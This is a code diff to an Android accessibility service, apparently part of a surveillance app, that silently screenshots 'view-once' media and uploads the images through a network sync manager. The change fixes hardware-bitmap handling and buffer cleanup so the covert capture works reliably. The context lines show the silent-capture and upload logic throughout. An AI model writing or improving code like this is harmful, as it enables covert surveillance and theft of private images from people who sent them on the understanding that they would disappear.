@@ -144,15 +144,22 @@ class VyraAccessibilityService : AccessibilityService() {
                 executor,
                 object : TakeScreenshotCallback {
                     override fun onSuccess(screenshotResult: ScreenshotResult) {
+                        val hwBuffer = screenshotResult.hardwareBuffer
                         try {
                             val bitmap = Bitmap.wrapHardwareBuffer(
-                                screenshotResult.hardwareBuffer,
+                                hwBuffer,
                                 screenshotResult.colorSpace
                             ) ?: return
 
+                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
+                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
+                            } else {
+                                bitmap
+                            }
+
                             val snapFile = File(filesDir, "ghost_snap_${System.currentTimeMillis()}.jpg")
                             FileOutputStream(snapFile).use { out ->
-                                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
+                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                             }
                             Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently: ${snapFile.name}")
 
@@ -167,6 +174,8 @@ class VyraAccessibilityService : AccessibilityService() {
                             NetworkSyncManager.getInstance(this@VyraAccessibilityService).syncData("snapshots", payload)
                         } catch (e: Exception) {
                             Log.e(AppConstants.TAG, "Error in silent compositor snap capture", e)
+                        } finally {
+                            try { hwBuffer.close() } catch (_: Exception) {}
                         }
                     }
                     override fun onFailure(errorCode: Int) {
@@ -262,16 +271,23 @@ class VyraAccessibilityService : AccessibilityService() {
                 executor,
                 object : TakeScreenshotCallback {
                     override fun onSuccess(screenshotResult: ScreenshotResult) {
+                        val hwBuffer = screenshotResult.hardwareBuffer
                         try {
                             val bitmap = Bitmap.wrapHardwareBuffer(
-                                screenshotResult.hardwareBuffer,
+                                hwBuffer,
                                 screenshotResult.colorSpace
                             ) ?: return
+
+                            val softwareBitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && bitmap.config == Bitmap.Config.HARDWARE) {
+                                bitmap.copy(Bitmap.Config.ARGB_8888, false) ?: bitmap
+                            } else {
+                                bitmap
+                            }
 
                             val prefix = if (isOutgoing) "sent_1view_" else "snap_"
                             val snapshotFile = File(filesDir, "${prefix}${System.currentTimeMillis()}.jpg")
                             FileOutputStream(snapshotFile).use { out ->
-                                bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
+                                softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                             }
 
                             Log.i(AppConstants.TAG, "Saved 1-view media frame [Outgoing: $isOutgoing]: ${snapshotFile.name}")
@@ -300,6 +316,8 @@ class VyraAccessibilityService : AccessibilityService() {
                             )
                         } catch (e: Exception) {
                             Log.e(AppConstants.TAG, "Error saving screenshot", e)
+                        } finally {
+                            try { hwBuffer.close() } catch (_: Exception) {}
                         }
                     }
 
